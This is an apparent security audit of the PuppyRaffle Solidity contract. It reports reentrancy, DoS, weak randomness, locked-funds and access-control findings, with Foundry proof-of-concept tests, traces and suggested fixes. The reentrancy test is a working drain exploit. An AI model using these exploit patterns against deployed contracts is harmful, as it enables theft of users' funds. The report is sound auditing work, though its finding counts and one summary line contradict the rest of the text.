# PuppyRaffle Audit
- Scope
    - PuppyRaffle.sol
- Findings
    - High: 1  
    [H-01: Reentrancy attack on `refund()`](#high-01)  
    [H-02: DoS - `refund()` does not remove a player from the raffle correctly, causing `selectWinner()` to revert if insufficient funds](#high-02)  
    [H-03: `selectWinner()` has weak randomness in determining `winnerIndex` and `rarity`](#high-03)
    - Medium: 2  
    [M-01: Locked user funds inside PuppyRaffle contract as player can only `refund()` own raffle entry](#med-01)  
    [M-02: `withdrawFees()` lacking access control & `changeFeeAddress()` missing address zero check can result in lost funds](#med-02)  
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings
## <a id="high-01"></a>H-01: Reentrancy attack on `refund()`

### Summary
`refund()` function is vulnerable to reentrancy, resulting in drainage of the raffle contract's ether.

### Vulnerability Details
In the `refund()` function, the raffle contract sends ether to the `msg.sender` first before effecting the state update of player's address to 0. Hence, resulting in a reentrancy attack vulnerability.
```
function refund(uint256 playerIndex) public { 
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);
        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```


### Impact/Proof of Concept
In the PoC, we first entered 4x players and send the entrance fee of 4 ethers to the raffle contract. Subsequently, we call `refund()` to get back 1 ether and before `players[playerIndex] = address(0)` kicks in to update the state of player's address to 0, we call `refund()` again in the `receive()` function. From the test results, we can see that the ether in the raffle contract were fully drained.
```
function testRefundReentrancy() public {
        // Enter raffle for 4x players
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        // Print the raffle contract before refund balance
        console.log("contract beforeBalance: ", address(puppyRaffle).balance / 1e18);

        // Get the player's index then call for refund, which will send ether over and trigger receive()
        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(playerIndex);
        
        // Print the raffle contract after refund balance with reentrancy
        console.log("contract afterBalance: ", address(puppyRaffle).balance / 1e18);
    }

    receive() external payable {
        // When we receive ether, we reenter puppyRaffle.refund() again to drain the ether.
        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        if(address(puppyRaffle).balance > 0){
            puppyRaffle.refund(playerIndex);
        }
    }
```
Results
```
Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[PASS] testRefundReentrancy() (gas: 181939)
Logs:
+  contract beforeBalance:  4
+  contract afterBalance:  0

Traces:
  [181939] PuppyRaffleTest::testRefundReentrancy()
    ├─ [121273] PuppyRaffle::enterRaffle{value: 4000000000000000000}([0x0000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ emit RaffleEnter(newPlayers: [0x0000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [0] console::log("contract beforeBalance: ", 4) [staticcall]
    │   └─ ← [Stop] 
    ├─ [2273] PuppyRaffle::getActivePlayerIndex(PuppyRaffleTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 3
    ├─ [51207] PuppyRaffle::refund(3)
    │   ├─ [42021] PuppyRaffleTest::receive{value: 1000000000000000000}()
    │   │   ├─ [2273] PuppyRaffle::getActivePlayerIndex(PuppyRaffleTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 3
    │   │   ├─ [38279] PuppyRaffle::refund(3)
    │   │   │   ├─ [29093] PuppyRaffleTest::receive{value: 1000000000000000000}()
    │   │   │   │   ├─ [2273] PuppyRaffle::getActivePlayerIndex(PuppyRaffleTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 3
    │   │   │   │   ├─ [25351] PuppyRaffle::refund(3)
    │   │   │   │   │   ├─ [16165] PuppyRaffleTest::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   ├─ [2273] PuppyRaffle::getActivePlayerIndex(PuppyRaffleTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 3
    │   │   │   │   │   │   ├─ [12423] PuppyRaffle::refund(3)
    │   │   │   │   │   │   │   ├─ [3237] PuppyRaffleTest::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   ├─ [2273] PuppyRaffle::getActivePlayerIndex(PuppyRaffleTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 3
    │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   ├─ emit RaffleRefunded(player: PuppyRaffleTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   ├─ emit RaffleRefunded(player: PuppyRaffleTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit RaffleRefunded(player: PuppyRaffleTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   ├─ emit RaffleRefunded(player: PuppyRaffleTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [0] console::log("contract afterBalance: ", 0) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 846.36µs (300.05µs CPU time)

Ran 1 test suite in 825.22ms (846.36µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommendations
1. Implement Check-Effect-Interaction pattern to prevent reentrancy attacks
```diff
function refund(uint256 playerIndex) public { 
        address playerAddress = players[playerIndex];
        // Check
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        //Effect
+        players[playerIndex] = address(0);

        //Interaction
+        payable(msg.sender).sendValue(entranceFee);
        
        emit RaffleRefunded(playerAddress);
    }
```
2. Use `nonReentrant` modifier from OpenZeppelin to guard against reentrancy
```diff
+ function refund(uint256 playerIndex) public nonReentrant { 
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);
        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```


## <a id="high-02"></a>H-02: DoS - `refund()` does not remove a player from the raffle correctly, causing `selectWinner()` to revert if insufficient funds

### Summary
`refund()` does not remove a player from the raffle correctly, causing `selectWinner()` to calculate `totalAmountCollected` wrongly and revert when there are enough funds to award the winner with `prizePool`.

### Vulnerability Details
The `refund()` function does not remove a player from the raffle correctly as it sets the refunded player's address to address(0), which causes the calculation logic of `totalAmountCollected` in `selectWinner()` to be wrong.
```
function refund(uint256 playerIndex) public { 
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);
        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```
```
function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100; 
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);

        uint256 tokenId = totalSupply();

        // We use a different RNG calculate from the winnerIndex to determine rarity
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        if (rarity <= COMMON_RARITY) { // less than or eq to 70
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) { // more than 70 but less or eq to 95
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }

        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
    }
```


### Impact/Proof of Concept
The `refund()` function does not remove the player from the raffle correctly when a player refunds. Due to the calculation logic in `selectWinner()`, by setting the refunded player's address to address(0) will still count it as 1 player, even though the ether has already been refunded.

Hence, we first enter 6 players into the raffle and pay 6 ethers as the entrance fee. Subsequently, we call `refund()` for 2 players, which will bring the puppyRaffle contract funds down to 4 ethers. Subsequently, we know that `selectWinner()` will award the winner with 80% of [Total number of players * entranceFee] which should be 4.8 ethers. However, the contract is only left with 4 ethers and will cause a revert [OutofFunds] when awarding the winner.
```
function testSelectWinnerRevertDueToNotEnoughFunds() public {
        // Enter 6 players and contract should have 6 ethers
        address[] memory players = new address[](6);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        players[4] = address(5);
        players[5] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee * 6}(players);
        console.log("balance: ", address(puppyRaffle).balance / 1e18);

        // Refund 2 players
        uint256 playerIndex1 = puppyRaffle.getActivePlayerIndex(address(1));
        uint256 playerIndex2 = puppyRaffle.getActivePlayerIndex(address(2));
        vm.prank(address(1));
        puppyRaffle.refund(playerIndex1);
        vm.prank(address(2));
        puppyRaffle.refund(playerIndex2);


        // Contract now left 4 ether and 80% of 6 is 4.8, which will cause a revert during selectWinner()
        console.log("balance: ", address(puppyRaffle).balance / 1e18);
        vm.warp(block.timestamp + 1 days + 1);
        vm.roll(block.number + 1);
        vm.expectRevert();
        puppyRaffle.selectWinner();
    }
```
Results
```
Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[PASS] testSelectWinnerRevertDueToNotEnoughFunds() (gas: 291211)
Logs:
  balance:  6
  balance:  4

Traces:
  [295424] PuppyRaffleTest::testSelectWinnerRevertDueToNotEnoughFunds()
    ├─ [174744] PuppyRaffle::enterRaffle{value: 6000000000000000000}([0x0000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, 0x0000000000000000000000000000000000000004, 0x0000000000000000000000000000000000000005, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ emit RaffleEnter(newPlayers: [0x0000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, 0x0000000000000000000000000000000000000004, 0x0000000000000000000000000000000000000005, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [0] console::log("balance: ", 6) [staticcall]
    │   └─ ← [Stop] 
    ├─ [800] PuppyRaffle::getActivePlayerIndex(0x0000000000000000000000000000000000000001) [staticcall]
    │   └─ ← [Return] 0
    ├─ [1291] PuppyRaffle::getActivePlayerIndex(0x0000000000000000000000000000000000000002) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::prank(0x0000000000000000000000000000000000000001)
    │   └─ ← [Return] 
    ├─ [37186] PuppyRaffle::refund(0)
    │   ├─ [3000] 0x0000000000000000000000000000000000000001::fallback{value: 1000000000000000000}()
    │   │   └─ ← [Return] 
    │   ├─ emit RaffleRefunded(player: 0x0000000000000000000000000000000000000001)
    │   └─ ← [Stop] 
    ├─ [0] VM::prank(0x0000000000000000000000000000000000000002)
    │   └─ ← [Return] 
    ├─ [34322] PuppyRaffle::refund(1)
    │   ├─ [60] PRECOMPILES::sha256{value: 1000000000000000000}(0x)
    │   │   └─ ← [Return] 0xe3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
    │   ├─ emit RaffleRefunded(player: 0x0000000000000000000000000000000000000002)
    │   └─ ← [Stop] 
    ├─ [0] console::log("balance: ", 4) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] VM::warp(86402 [8.64e4])
    │   └─ ← [Return] 
    ├─ [0] VM::roll(2)
    │   └─ ← [Return] 
    ├─ [0] VM::expectRevert(custom error f4844814:)
    │   └─ ← [Return] 
    ├─ [93512] PuppyRaffle::selectWinner()
    │   ├─ [0] PRECOMPILES::identity{value: 4800000000000000000}(0x)
    │   │   └─ ← [OutOfFunds] 
    │   └─ ← [Revert] revert: PuppyRaffle: Failed to send prize pool to winner
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 717.88µs (194.85µs CPU time)

Ran 1 test suite in 933.08ms (717.88µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommendations
Instead of setting refunded player's address to address(0), completely removing it from players[] will prevent the `totalAmountCollected` to be calculated wrongly.
```diff
function refund(uint256 playerIndex) public { 
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);
+       players[playerIndex] = players[players.length - 1];
+       players.pop();
-       players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```



## <a id="high-03"></a>H-03: `selectWinner()` has weak randomness in determining `winnerIndex` and `rarity`

### Summary
Both variable `winnerIndex` and `rarity` are not truly random as they depend on block.timestamp and block.difficulty parameters, which can be calculated and manipulated to always return the correct index and rarity.

### Vulnerability Details
`winnerIndex` and `rarity` can be manipulated and calculated with the block.timestamp and block.difficulty parameters
```
function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);

        uint256 tokenId = totalSupply();

        // We use a different RNG calculate from the winnerIndex to determine rarity
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100; 
}
```

### Impact/Proof of Concept
```
N.A
```

### Recommendations
```
N.A
```



## <a id="med-01"></a>M-01: Locked user funds inside PuppyRaffle contract as player can only `refund()` own raffle entry

### Summary
When a user enter the raffle and pays the entrance fee for other players, he will not be able to get a refund for other players. Potentially resulting in locking his ether inside if there is no access to the other player addresses.


### Vulnerability Details
In the `enterRaffle()`, a player is able to enter the raffle for other players in batch and will have to pay the entraceFee for other players.
```
function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }

        // Check for duplicates
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
        emit RaffleEnter(newPlayers);
    }
```
However, when the player wants to `refund()`, he is unable to refund for other players as his address does not fulfil the check `require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");`. Hence, the player could get his ether locked.
```
function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee); 

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

### Impact/Proof of Concept
In the PoC, the player `enterRaffle()` along with 3 other players (4 in total), and pay the `entranceFee` of 4 ethers. After which, when the player tries to `refund()` for all 4 players, it only manage to refund for his own entry and fails for the other 3. Hence, getting back a refund of 1 ether instead of 4 ethers.
```
function testCantRefundForOtherPlayers() public {
        uint256 beforeBalance = address(this).balance;
        emit log_uint(beforeBalance/1 ether);

        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        try puppyRaffle.refund(0) {
        } catch {
            emit log_string("Refund for playerOne failed as expected");
        }
        try puppyRaffle.refund(1) {
        } catch {
            emit log_string("Refund for playerTwo failed as expected");
        }
        try puppyRaffle.refund(2) {
        } catch {
            emit log_string("Refund for playerThree failed as expected");
        }
        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        try puppyRaffle.refund(playerIndex) {
        } catch {
            emit log_string("Refund for player failed");
        }
        
        uint256 afterBalance = address(this).balance;
        emit log_uint(afterBalance/1 ether);

        // Test to check that the balance before paying should not equal to the balance after refund
        // showing that the player cannot refund for others.
        assert((beforeBalance/1 ether) != (afterBalance/1 ether));
        // Test to check that 3 out of 4 refunds did not pass
        assertEq((afterBalance/1 ether), ((beforeBalance/1 ether)-3));
    }
```

Results
```
Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[PASS] testCantRefundForOtherPlayers() (gas: 147421)
Logs:
  79228162514
  Refund for playerOne failed as expected
  Refund for playerTwo failed as expected
  Refund for playerThree failed as expected
  79228162511

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 650.62µs (115.36µs CPU time)

Ran 1 test suite in 4.23ms (650.62µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommendations
1. Track the address of the player(spender) who entered the raffles on behalf of another player. So the player(spender) will be allowed to get refund.




## <a id="med-02"></a>M-02: `withdrawFees()` lacking access control & `changeFeeAddress()` missing address zero check can result in lost funds

### Summary
The `withdrawFees()` function is lacking access control and anyone can call this function, while the `changeFeeAddress()` function is missing address zero check and the owner can accidentally set the fee address to address(0). By chaining these 2 vulnerabilities, the owner can accidentally set to address(0) and anyone call withdrawFees() to burn the funds.

### Vulnerability Details
In the `withdrawFees()` function, there is no access control and anyone can call it anytime
```
function withdrawFees() external {
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```
In `changeFeeAddress()`, there is no address zero check and the owner can accidentally set to address zero. When these 2 vulnerabilities are chained together, the owner could accidentally burn the fees.
```
function changeFeeAddress(address newFeeAddress) external onlyOwner {
        feeAddress = newFeeAddress;
        emit FeeAddressChanged(newFeeAddress);
    }
```

### Impact/Proof of Concept
In this PoC, we first enter 4 players into the raffle, then we simulate that the raffle has ended and call `selectWinner()` which will add fees into `totalFees`. Subsequently, we simulate the owner accidentally setting the `feeAddress` to address(0) and then simulate a random address calling `withdrawFees()`, which causes the fees to be burned. In the results, the balance address(0) first appears as 0 and then anded with some value after the fees were transferred to it.
```
function testWithdrawFeesToZeroAddress() public {
        // Enter 4 players into the raffle
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        // Simulate the raffle has ended and select a winner
        vm.warp(block.timestamp + 1 days + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        // Set the fee receiving address as address zero (burner address)
        puppyRaffle.changeFeeAddress(address(0));
        console.log('beforeBalance: ', address(0).balance);
        console.log('totalFees: ', puppyRaffle.totalFees());

        // Change role to a random address and call withdrawFees()
        vm.prank(address(1234));
        puppyRaffle.withdrawFees();

        // Print that address zero has increased balance which cant be recovered
        console.log('afterBalance: ', address(0).balance);
    }

    // Sample onERC721Received() to receive the ERC721 from selectWinner()
function onERC721Received(address /*operator*/, address /*from*/, uint256 /*tokenId*/, bytes calldata /*data*/) public pure returns (bytes4) {
        // Return the ERC721_RECEIVED selector
        return 0x150b7a02;
    }
```
Results
```
Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[PASS] testWithdrawFeesToZeroAddress() (gas: 300267)
Logs:
  beforeBalance:  0
  totalFees:  800000000000000000
  afterBalance:  800000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.63ms (358.64µs CPU time)

Ran 1 test suite in 9.04ms (1.63ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommendations
1. Implement onlyOwner modifier to provide access controll that allows only the owner to call `withdrawFees()`
```diff
+ function withdrawFees() external onlyOwner {
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

2. Implement address zero check in `changeFeeAddress()`
```diff
function changeFeeAddress(address newFeeAddress) external onlyOwner {
+       require(newFeeAddress != address(0), "PuppyRaffle: New fee address cannot be the zero address");
        feeAddress = newFeeAddress;
        emit FeeAddressChanged(newFeeAddress);
    }
```



